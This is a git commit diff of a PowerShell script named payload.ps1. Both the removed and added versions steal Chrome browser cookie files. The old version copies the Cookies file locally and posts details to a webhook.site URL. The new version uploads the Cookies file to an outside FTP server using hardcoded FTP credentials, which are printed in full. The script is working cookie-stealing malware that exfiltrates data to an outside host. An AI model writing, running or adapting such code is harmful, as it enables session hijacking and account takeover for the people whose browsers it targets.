8bc45b2645fd4bd86b739004b8877f450f5afa1e
mbalochdev <132405677+mbalochdev@users.noreply.github.com>
2024-02-11 15:58:17 +0500

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,38 +1,34 @@
-# Define the target directory
-$targetDirectory = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data"
+# Define the source directories and the file name you want to copy
+$sourceDir1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+$sourceDir2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies"
 
-# Define the file name to search for
-$fileName = "Cookies"
+# FTP Server details
+$ftpServer = "ftp://us-east-1.sftpcloud.io"
+$ftpUser = "d45b8e2d698147e59f2234fd87b98082"
+$ftpPassword = "CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p"
+$ftpFilePath = "/" # Adjust the path on your FTP server
 
-# Navigate to the target directory
-Set-Location -Path $targetDirectory
-
-# Search for the file
-$file = Get-ChildItem -Recurse | Where-Object { $_.Name -eq $fileName }
-
-# Check if the file was found
-if ($file -ne $null) {
-    # Define the destination path for the file copy to C:\Temp
-    $destinationDirectory = "C:\Temp"
-    $destinationPath = Join-Path -Path $destinationDirectory -ChildPath $fileName
-    
-    # Check if the destination directory exists, create it if it doesn't
-    if (-not (Test-Path -Path $destinationDirectory)) {
-        New-Item -ItemType Directory -Path $destinationDirectory
-    }
-
-    # Copy the file to the destination
-    Copy-Item -Path $file.FullName -Destination $destinationPath
-
-    # Preparing data for sending to a webhook (hypothetically)
-    $uri = "https://webhook.site/e133adb0-4321-413a-aff1-7e0495c990cc"
-    $body = @{
-        FileName = $fileName
-        FilePath = $destinationPath
-    } | ConvertTo-Json
-
-    # Send data to the webhook server
-    Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
-} else {
-    Write-Output "File $fileName not found."
+# Function to upload file to FTP server
+function Upload-ToFtp($localFilePath, $ftpUrl, $ftpUser, $ftpPassword) {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
+    $uri = New-Object System.Uri($ftpUrl)
+    $webClient.UploadFile($uri, $localFilePath)
 }
+
+# Step 1 & 2: Check if source directory 1 exists and copy file to FTP
+if (Test-Path $sourceDir1) {
+    $ftpUrl = $ftpServer + $ftpFilePath
+    Upload-ToFtp $sourceDir1 $ftpUrl $ftpUser $ftpPassword
+    Write-Host "File uploaded to FTP server from projects directory."
+} else {
+    Write-Host "The directory $sourceDir1 does not exist."
+}
+
+# Step 3 & 4: Check if source directory 2 exists. If not, ignore.
+if (Test-Path $sourceDir2) {
+    Write-Host "Directory $sourceDir2 exists. No action needed as per instruction."
+} else {
+    Write-Host "The directory $sourceDir2 does not exist. Ignoring as per instruction."
+}
+
